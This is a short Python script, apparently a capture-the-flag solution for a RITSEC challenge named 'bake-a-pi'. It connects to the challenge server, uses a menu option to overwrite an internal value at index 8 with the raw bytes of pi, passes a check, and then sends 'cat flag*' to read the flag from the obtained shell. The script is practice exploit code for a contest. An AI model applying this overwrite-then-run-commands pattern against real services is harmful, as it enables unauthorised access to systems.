import struct, socket, time

s = socket.socket()
s.connect(('bake-a-pi.ctf.ritsec.club', 1555))

pi_bytes = struct.pack('<d', 3.141592653589793)  # b'\x18-DT\xfb!\t@'

time.sleep(0.5); s.recv(4096)
s.send(b'C\n');  time.sleep(0.3); s.recv(4096)  # Change ingredient
s.send(b'8\n');  time.sleep(0.3); s.recv(4096)  # Index 8 = pi variable
s.send(pi_bytes + b'\n')                          # Overwrite with real π
time.sleep(0.3); s.recv(4096)
s.send(b'T\n');  time.sleep(0.5); s.recv(4096)  # Taste test → PASS
s.send(b'cat flag*\n')
print(s.recv(4096).decode())